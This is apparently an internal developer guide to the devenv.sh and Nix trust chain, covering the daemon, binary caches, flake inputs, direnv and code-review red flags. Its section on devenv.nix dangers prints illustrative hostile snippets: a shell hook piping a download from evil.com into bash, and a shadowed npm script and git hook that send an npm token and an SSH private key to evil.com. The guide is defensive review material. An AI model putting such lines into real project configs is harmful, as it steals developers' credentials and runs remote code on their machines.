# Devenv.sh Trust Model: A Developer's Guide

## Who This Is For

You use devenv.sh. You run `devenv shell` or have direnv auto-activate your project. This document explains what you are trusting when you do that, how each piece is verified (or not), and what to watch for when reviewing changes to devenv files.

You do not need to be a security engineer to read this. You do need to care about not having your credentials stolen or your machine compromised by a malicious dependency.

---

## Part 1: What You Trust When You Run `devenv shell`

Running `devenv shell` activates a chain of trust that touches eight distinct components. Each one can run code on your machine or influence what code runs. Here they are, from the ground up.

### 1. The Nix Daemon and Its Configuration

**What it is**: The Nix daemon (`nix-daemon`) runs as root and manages the Nix store (`/nix/store`). Every package build, download, and installation goes through it.

**What you are trusting**: That the daemon is correctly configured, that its settings (in `/etc/nix/nix.conf` or NixOS configuration) have not been weakened, and that users with `trusted-users` access have not abused it.

**Why it matters**: A user listed in `trusted-users` in `nix.conf` has **root-equivalent access** to the Nix daemon. They can disable the build sandbox, add arbitrary binary caches, and import unsigned packages. Devenv's own documentation recommends adding your user to `trusted-users` for convenience -- this is the single largest security regression in a typical devenv setup.

**The safer alternative**: Instead of `trusted-users`, your system `nix.conf` should list devenv's caches in `trusted-substituters` and their keys in `trusted-public-keys`. This lets you use the caches without granting yourself root-equivalent daemon access.

```nix
# NixOS configuration (the safe way)
nix.settings = {
  trusted-substituters = [
    "https://devenv.cachix.org"
    "https://cachix.cachix.org"
  ];
  trusted-public-keys = [
    "devenv.cachix.org-1:w1cLUi8dv3hnoSPGAuibQv+f9TZLr6cv/Hm9XgU50cw="
    "cachix.cachix.org-1:eWNHQldwUO7G2VkjpnjDbWwy4KQ/HNxht7H4SSoMckM="
  ];
};

# Do NOT do this:
# nix.settings.trusted-users = [ "root" "yourname" ];
```

### 2. The Devenv Binary Itself

**What it is**: The `devenv` CLI -- a Rust binary that orchestrates Nix evaluation, caching, and process management. Since v2.0, it calls the Nix evaluator directly via C FFI rather than spawning `nix` CLI processes.

**What you are trusting**: That the devenv binary you installed is the one the Cachix team published, and that their source code is not malicious. Devenv is installed via Nix (`nix profile install nixpkgs#devenv`), so it goes through Nix's normal hash verification and signature checking. It is not installed via `curl | sh`.

**Verification**: The binary's Nix store path includes a hash of its build inputs. If you installed from nixpkgs, it was built by Hydra (the NixOS build farm) and signed with the `cache.nixos.org` key. You can verify this:

```bash
nix path-info --json $(which devenv) | jq '.[].signatures'
```

**What could go wrong**: A compromise of the Cachix GitHub organization (`github.com/cachix/devenv`) or the Hydra build infrastructure could produce a malicious devenv binary. This is a high-difficulty attack.

### 3. Nixpkgs (The Package Definitions)

**What it is**: The package set that provides `pkgs.git`, `pkgs.python`, and everything else in your environment. It is a monorepo of ~100,000 Nix expressions that describe how to build software from source.

**What you are trusting**: That the specific nixpkgs commit pinned in your `devenv.lock` does not contain malicious build instructions. Approximately 139 people have direct commit access to nixpkgs. Contributions go through code review, but the master branch has not historically enforced mandatory CI gating or reviewer approval.

**The devenv-nixpkgs wrinkle**: By default, devenv does not use upstream nixpkgs. It uses `github:cachix/devenv-nixpkgs/rolling` -- a Cachix-maintained fork that adds patches on top of `nixpkgs-unstable`. This fork has a smaller review surface than upstream nixpkgs. You are trusting both the upstream nixpkgs committers and the Cachix team's patches.

**Switching to upstream**: You can use upstream nixpkgs directly by changing `devenv.yaml`:

```yaml
inputs:
  nixpkgs:
    url: github:NixOS/nixpkgs/nixos-24.11
```

This removes the Cachix fork from your trust chain but means devenv's binary cache (`devenv.cachix.org`) will have fewer pre-built packages for your setup, so more packages will build from source.

### 4. Binary Caches (Pre-Built Packages)

**What it is**: Instead of building every package from source, Nix downloads pre-built binaries from binary caches. By default, devenv configures three:

| Cache | Operator | What it serves |
|-------|----------|---------------|
| `cache.nixos.org` | NixOS Foundation / Hydra | Packages built from upstream nixpkgs |
| `devenv.cachix.org` | Cachix (the company) | Devenv's own packages + devenv-nixpkgs builds |
| `cachix.cachix.org` | Cachix (the company) | Cachix tooling |

**What you are trusting**: That the operator of each cache has not been compromised and is serving binaries that match what the source code would produce if built locally.

**How verification works**: Each cache has a signing key. When Nix downloads a package, it checks the Ed25519 signature against the keys in `trusted-public-keys`. If the signature does not match, the download is rejected and Nix builds from source. The `require-sigs = true` setting (on by default) enforces this.

**What verification is missing**:
- There is no multi-party signing. Each cache has a single signing key. If that key is compromised, all packages from that cache are suspect.
- Signatures cover the store path and content hash, but **not the derivation that built it**. You know the bytes are what the cache operator signed, but you cannot prove they were built from the source code you expect.
- Trust is all-or-nothing per cache. You cannot trust a cache for `git` but not for `openssl`.

**Adding caches in devenv.nix**: When someone adds `cachix.pull = [ "someones-cache" ];` to `devenv.nix`, they are trusting that cache operator for all packages it serves. This is a significant trust expansion and should be reviewed carefully.

### 5. Flake Inputs (Other Repos Your devenv.yaml References)

**What it is**: Beyond nixpkgs, your `devenv.yaml` can reference other Git repositories as inputs. These might provide devenv modules, overlays, or additional package definitions.

```yaml
inputs:
  nixpkgs:
    url: github:NixOS/nixpkgs/nixos-24.11
  my-company-modules:
    url: github:mycompany/devenv-modules
```

**What you are trusting**: Every flake input is arbitrary Nix code that runs during evaluation. There is no sandboxing at evaluation time -- `.nix` files execute with your full user privileges. A malicious input can read files from your filesystem (`builtins.readFile`), and with impure evaluation enabled, can read environment variables.

**How verification works**: The `devenv.lock` file pins every input to a specific Git commit hash and a SHA-256 content hash (`narHash`). When Nix fetches an input, it verifies the content hash matches. If someone tampers with the Git history to change what a commit hash points to, the `narHash` check catches it.

**What verification is missing**:
- No signature verification on Git commits (the experimental `verified-fetches` feature will add this when stabilized)
- The lock file relies on Git integrity for provenance -- there is no independent attestation that a commit was authored by who it claims
- Running `devenv update` replaces all pinned hashes with whatever is currently at the tip of the referenced branch, without showing you what changed

### 6. devenv.nix (The Environment Definition)

**What it is**: The Nix file that defines your environment -- packages, environment variables, shell hooks, scripts, services, and git hooks. This is the file you edit most often.

**What you are trusting**: That the code in this file does what it appears to do. This sounds obvious, but consider: `enterShell` runs arbitrary bash with your full user privileges every time you enter the shell. `scripts.*` definitions become commands in your `$PATH`. `git-hooks.hooks` run on every `git commit`.

**How verification works**: Code review. There is no other mechanism. `devenv.nix` is evaluated by the Nix interpreter, which runs unsandboxed with your full user privileges. Nix's build sandbox only applies later, during package building -- not during evaluation.

**Specific dangers in devenv.nix**:

```nix
# This runs every time you enter the shell, with your full permissions:
enterShell = ''
  curl -s https://evil.com/payload | bash
'';

# This creates a command called "npm" that shadows the real one:
scripts.npm.exec = ''
  # steal credentials, then call real npm
  curl -s https://evil.com/exfil?token=$NPM_TOKEN
  ${pkgs.nodejs}/bin/npm "$@"
'';

# This runs on every git commit:
git-hooks.hooks.custom-hook = {
  enable = true;
  entry = "${pkgs.bash}/bin/bash -c 'curl -s https://evil.com/exfil --data @$HOME/.ssh/id_ed25519'";
};
```

**The devenv.local.nix problem**: `devenv.local.nix` is loaded alongside `devenv.nix` but is `.gitignore`d by convention. It can override any setting in `devenv.nix`, including security controls. There is no team visibility into what a developer's `devenv.local.nix` contains, and there is no mechanism to prevent it from disabling security hooks or adding packages.

### 7. Devenv Modules (Language/Service Modules)

**What it is**: When you write `languages.python.enable = true` or `services.postgres.enable = true`, you are importing NixOS-style modules from devenv's own repository. There are 50+ language modules and 40+ service modules.

**What you are trusting**: That these modules, maintained by the Cachix team and community contributors, do only what their names imply. Modules have **unrestricted access** to the entire devenv configuration -- a module imported for "Python support" could silently add `enterShell` code, modify `$PATH`, add binary caches, or inject additional packages.

**How verification works**: Module source code is in the `cachix/devenv` GitHub repository and is pinned via `devenv.lock`. You can inspect any module by reading its source in the Nix store:

```bash
# Find where the devenv modules live in your store
nix eval --raw .#devenv-up.drvPath 2>/dev/null
# Or inspect the devenv repo's modules/ directory on GitHub
```

**What verification is missing**: There is no capability model. A module cannot declare "I only need to add packages" and be prevented from touching `enterShell`. You have to read the module source to know what it does.

**Some service modules automatically add binary caches**: When you enable certain services, devenv adds their Cachix cache to `cachix.pull` automatically, expanding your trust surface without an explicit decision.

### 8. Direnv (.envrc Auto-Loading)

**What it is**: The `.envrc` file that direnv uses to auto-activate your devenv environment when you `cd` into the project directory. It typically contains:

```bash
eval "$(devenv direnvrc)"
use devenv
```

**What you are trusting**: That the `.envrc` file has not been modified maliciously. Direnv gates execution with `direnv allow`, which records a hash of the `.envrc` contents. If `.envrc` changes, direnv refuses to load it until you re-approve.

**The critical gap**: Direnv only hash-checks `.envrc` itself. It does NOT detect changes to `devenv.nix`, which is what `.envrc` invokes. After you run `direnv allow` once, any subsequent change to `devenv.nix` (for example, after `git pull`) takes effect the next time your shell prompt renders -- with no approval step. This means a malicious `devenv.nix` change pushed to a shared branch executes silently on every developer who has previously run `direnv allow`.

**Devenv's native activation** (`devenv allow`/`devenv revoke`, available since v2.0) provides a separate trust mechanism, but it also does not re-prompt when `devenv.nix` changes.

---

## Part 2: How Each Trust Dependency Is Verified

| Component | Verification Mechanism | What is NOT verified | What an attacker needs |
|-----------|----------------------|---------------------|----------------------|
| **Nix daemon** | System configuration, root ownership | Whether trusted-users is too permissive | Root access or social engineering to get added to trusted-users |
| **Devenv binary** | Nix store hash + cache signature | Whether the source repo was compromised before the build | Compromise of Cachix GitHub org or Hydra build infra |
| **Nixpkgs** | Commit pinned in lock file, narHash integrity | Whether the commit contains malicious code (no automated security audit) | Compromised nixpkgs committer account (1 of ~139) |
| **Binary caches** | Ed25519 signature per store path | Provenance (what source code produced the binary), multi-party attestation | Compromised cache signing key |
| **Flake inputs** | Commit + narHash pinned in lock file | Git commit signatures, author identity | Write access to the input repository |
| **devenv.nix** | Code review (only mechanism) | Anything that passes review | Getting malicious code merged (PR, compromised account, social engineering) |
| **Devenv modules** | Pinned in lock file, open source | What the module actually modifies (no capability restrictions) | Compromise of cachix/devenv repo or a module dependency |
| **Direnv (.envrc)** | Content hash checked by `direnv allow` | Changes to files that .envrc invokes (devenv.nix) | Ability to modify devenv.nix in a repo the developer has already allowed |

---

## Part 3: What to Watch for in Code Review

Every attack vector in the threat model converges on one control point: **code review of devenv files**. There is no defense-in-depth after review -- if a malicious change passes review, it executes with your full user privileges.

### Reviewing devenv.nix Changes

Watch for these patterns:

**Shell hooks and scripts** -- Any change to `enterShell`, `scripts.*`, or `enterTest`. These are arbitrary bash that runs with your full user privileges. Ask: does this need to download anything? Does it reference external URLs? Does it modify files outside the project?

```nix
# Suspicious: why is enterShell downloading something?
enterShell = ''
  curl -s https://example.com/setup.sh | bash
'';

# Suspicious: why is a script shadowing a well-known command name?
scripts.npm.exec = "...";
scripts.docker.exec = "...";
scripts.git.exec = "...";
```

**New packages** -- Adding packages is normally fine, but watch for:
- Packages from non-standard sources (overlays, custom derivations)
- Packages that seem unrelated to the project
- Unfamiliar package names (could be typosquatting in external inputs)

**Overlays** -- `overlays = [ ... ]` can replace any package with a modified version. An overlay from an external input can silently trojanize `openssl`, `coreutils`, or any other package. Any overlay addition deserves careful scrutiny.

```nix
# This replaces the real curl with a modified version. Why?
overlays = [
  (final: prev: {
    curl = prev.curl.overrideAttrs (old: {
      patches = old.patches ++ [ ./my-curl-patch.patch ];
    });
  })
];
```

**Git hooks** -- Changes to `git-hooks.hooks` modify what runs on every commit. Custom hooks with an `entry` field can run arbitrary commands.

**Cachix configuration** -- `cachix.pull` additions trust a new binary cache operator for all packages they serve.

### Reviewing devenv.yaml Changes

**New inputs** -- Any new `inputs:` entry is a new repository whose Nix code will execute during evaluation with your user privileges. Verify the URL is correct (typosquatting is possible with flake input URLs).

**Cache additions** -- `cachix.pull` additions in any form expand the binary trust surface.

**`impure: true`** -- This disables Nix's pure evaluation mode, allowing `devenv.nix` to read environment variables and access files outside the project. This is sometimes necessary but should be justified.

**`clean.enabled: false`** or removal of `clean` -- Disabling the clean environment lets credentials from your parent shell (AWS keys, API tokens) leak into the devenv environment where any package or script can read them.

**`nixpkgs` changes** -- Switching the nixpkgs input (especially to a fork or non-standard branch) changes the entire package trust chain.

### Reviewing devenv.lock Changes

Lock file diffs are tedious -- they are JSON with long hashes. But they matter:

**Look at which inputs changed** -- A legitimate `devenv update` changes the `rev` and `narHash` of inputs. Verify that the inputs that changed are the ones you expected. An unexpected input change could indicate lock file tampering.

**Watch for new nodes** -- New entries in the lock file mean new flake inputs were added. These should correspond to explicit additions in `devenv.yaml`.

**Watch for `owner` or `repo` changes** -- If an input's GitHub owner or repository name changed, the input is now pointing to a different codebase.

### Reviewing .envrc Changes

The `.envrc` file should contain exactly:

```bash
eval "$(devenv direnvrc)"
use devenv
```

Any additions (extra `source` commands, additional `eval`, arbitrary bash) should be questioned. `.envrc` runs in your shell with your full privileges.

---

## Part 4: Red Flags

These patterns should trigger extra scrutiny. They are not always malicious, but they require justification.

### Immediate Red Flags (Block the PR)

| Pattern | Why it is dangerous | What to ask |
|---------|-------------------|-------------|
| New `cachix.pull` entries | Trusts a new binary cache operator for arbitrary packages | Who operates this cache? Why do we need it? Can we build from source instead? |
| `impure: true` added | Allows devenv.nix to read host environment variables and arbitrary files | What specifically requires impure evaluation? Can it be achieved differently? |
| `builtins.fetchurl` in .nix files | Downloads content during Nix evaluation (not sandboxed) | Why does evaluation need network access? Can this be a fixed-output derivation instead? |
| `enterShell` with `curl`, `wget`, or piped execution | Downloads and runs code every time a developer opens the shell | What is being downloaded? Why can it not be a Nix package? |
| Overlays from external inputs | Can silently replace any package in the environment | What does this overlay modify? Have you read the overlay source? |
| `.envrc` with anything beyond `use devenv` | Arbitrary bash in the shell activation path | Why does .envrc need custom code? |

### Elevated Scrutiny (Understand Before Approving)

| Pattern | Risk | Context needed |
|---------|------|---------------|
| `devenv.lock` changes to `owner` or `repo` fields | Input now points to a different codebase | Was this intentional? What moved? |
| `scripts.*` with common tool names (`npm`, `yarn`, `docker`, `git`, `ssh`) | Could shadow legitimate tools | Does this wrap the real tool or replace it? |
| `git-hooks.hooks` with custom `entry` fields | Arbitrary commands on every commit | What does the command do? Is it from a Nix package? |
| `processes.*.linux.capabilities` additions | Grants elevated privileges to processes | Does this service genuinely need `CAP_NET_RAW` or similar? |
| `dotenv.enable = true` | Loads `.env` files which may contain secrets | Are `.env` files in `.gitignore`? Should we use SecretSpec instead? |
| `nixpkgs.config.allowUnfree = true` | Permits unfree packages, which may have less community review | Which specific unfree package is needed? |
| `devenv.local.nix` mentioned or referenced | Can override all security controls without team visibility | What is being overridden and why? |

### Information-Only (Note and Approve)

| Pattern | Why it is fine |
|---------|---------------|
| `devenv.lock` hash changes after `devenv update` | Normal dependency update; verify inputs are expected |
| New packages from nixpkgs | Standard package additions; verify names are correct |
| Language module enablement (`languages.*.enable`) | Built-in modules; low risk |
| Service module enablement (`services.*.enable`) | Built-in modules; note that some auto-add caches |

---

## Part 5: What the Hardened Boilerplate Protects Against

The hardened boilerplate described in `config-options-research.md` makes specific configuration choices. Here is what each choice defends against.

### `clean.enabled: true` -- Credential Leakage Prevention

**Threat**: Without a clean environment, your devenv shell inherits every environment variable from your parent shell. This includes `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `NPM_TOKEN`, database passwords -- anything you have set globally or in a parent shell. Every package and script in your devenv environment can read these.

**Protection**: `clean.enabled: true` starts the devenv shell with a minimal environment containing only the variables explicitly listed in `clean.keep`. Credentials from your parent shell do not leak in.

**What it does NOT protect against**: Secrets intentionally placed in `env.*` settings in `devenv.nix`, which still end up in the environment (and in the world-readable Nix store).

### `impure: false` -- Evaluation Sandboxing

**Threat**: Impure evaluation allows `devenv.nix` to call `builtins.getEnv` to read host environment variables and access files outside the project's source tree during evaluation. A malicious `devenv.nix` could exfiltrate credentials or fingerprint your system during the evaluation phase.

**Protection**: With `impure: false` (the default), Nix's pure evaluation mode restricts file access to cryptographically-hashed store paths and the project's own source tree. `builtins.getEnv` is disabled.

**What it does NOT protect against**: `builtins.readFile` can still read files within the project tree. And the build phase (after evaluation) has different rules -- fixed-output derivations get network access.

### `secretspec.enable: true` -- Secrets Out of the Nix Store

**Threat**: Secrets embedded in `devenv.nix` (via `env.DATABASE_PASSWORD = "..."`) become part of Nix store paths, which are world-readable on multi-user systems. Any user on the machine can read them. They persist indefinitely in the Nix store.

**Protection**: SecretSpec separates secret declaration from provisioning. Secrets are defined in `secretspec.toml` and loaded at runtime from a backend (keyring, 1Password, etc.). Using `secretspec run -- [command]` keeps secrets out of the shell environment entirely.

**What it does NOT protect against**: A developer who ignores SecretSpec and puts secrets directly in `env.*` or `enterShell`.

### Upstream nixpkgs pinning -- Trust Chain Reduction

**Threat**: devenv's default package source (`devenv-nixpkgs/rolling`) is a Cachix-maintained fork with patches not reviewed by the broader nixpkgs community. You are trusting both upstream nixpkgs committers and the Cachix team.

**Protection**: Pinning to `github:NixOS/nixpkgs/nixos-24.11` (a stable release branch) removes the Cachix fork from your trust chain and uses a version that has received broader testing and a security support window.

**What it does NOT protect against**: Vulnerabilities in upstream nixpkgs that have not yet been patched. Using a stable branch means you get security fixes later than `nixpkgs-unstable` (though `nixos-24.11` has active backporting).

### `git-hooks` with `ripsecrets` -- Commit-Time Secret Detection

**Threat**: A developer accidentally commits a secret (API key, password, private key) to the repository, exposing it to everyone with repository access and potentially to the public if the repo is or becomes public.

**Protection**: `ripsecrets` scans staged files at commit time and blocks the commit if it finds patterns matching common secret formats (AWS keys, GitHub tokens, RSA private keys, etc.).

**What it does NOT protect against**: Secrets that do not match ripsecrets' pattern library (custom secret formats, encoded secrets). Adding `gitleaks` as a second scanner provides broader coverage.

### `dotenv.enable = false` -- No Implicit Secret Loading

**Threat**: `.env` files commonly contain secrets. `dotenv.enable = true` loads these files into the environment, where they are visible to all processes. If `.env` files are accidentally committed, secrets are exposed in version control.

**Protection**: Disabling dotenv forces explicit secret management through SecretSpec rather than implicit file loading.

**What it does NOT protect against**: A developer re-enabling dotenv in `devenv.local.nix`.

### `require_version: ">=2.1"` -- Minimum Version Enforcement

**Threat**: Older devenv versions may have known bugs or missing security features. A developer with an outdated installation might not have fixes for known issues.

**Protection**: `require_version` refuses to activate the environment if the installed devenv version is too old.

### System-Level nix.conf Hardening (Not in devenv files)

The following protections require system-level configuration and cannot be set from `devenv.nix` or `devenv.yaml`:

| Setting | What it prevents |
|---------|-----------------|
| `sandbox = true` | Builds escaping their isolation (already the default on NixOS) |
| `sandbox-fallback = false` | Silent fallback to unsandboxed builds when the kernel lacks namespace support |
| `require-sigs = true` | Accepting unsigned binaries from caches (already the default) |
| `trusted-substituters` (instead of `trusted-users`) | Root-equivalent daemon access for regular users |
| `accept-flake-config = false` | Flakes silently adding binary caches or modifying Nix settings |

---

## Summary: The Trust Chain at a Glance

When you run `devenv shell`, you are trusting:

1. **Your system admin** configured the Nix daemon correctly (no `trusted-users` for regular accounts)
2. **The Cachix team** to maintain the devenv binary, devenv modules, and (if using the default) devenv-nixpkgs
3. **~139 nixpkgs committers** to not introduce malicious code into package definitions
4. **Binary cache operators** (NixOS Foundation for cache.nixos.org, Cachix for devenv.cachix.org) to not serve tampered binaries
5. **Authors of your flake inputs** to not push malicious code to branches you track
6. **Your teammates** to write `devenv.nix` that does what it claims (code review is the primary control)
7. **Direnv / devenv auto-activation** to only activate on projects you have explicitly allowed

The hardened boilerplate narrows this trust chain where possible (removing the devenv-nixpkgs fork dependency, enforcing clean environments, blocking secret leakage) and makes the remaining trust dependencies visible and auditable through code review, git hooks, and documentation.

The single most important thing to remember: **Nix evaluation is not sandboxed.** Any `.nix` file that gets evaluated runs with your full user privileges. The build sandbox only kicks in later, during package building. Code review of `devenv.nix` and its inputs is not just a best practice -- it is the primary security boundary.

---

## Sources

This document synthesizes findings from the following spike reports:

- [Security Attack Surface & Threat Model](security-surface-research.md) -- full threat model with 10 attack vectors
- [Nix Security Mechanisms](nix-security-mechanisms-research.md) -- what Nix provides at each layer
- [Architecture & Internals](architecture-research.md) -- how devenv works under the hood
- [Configuration Options Inventory](config-options-research.md) -- every security-relevant configuration knob
- [Prior Art & Community Practices](prior-art-research.md) -- what exists in the ecosystem today

Raw source material (88 documents) is in `docs/`.
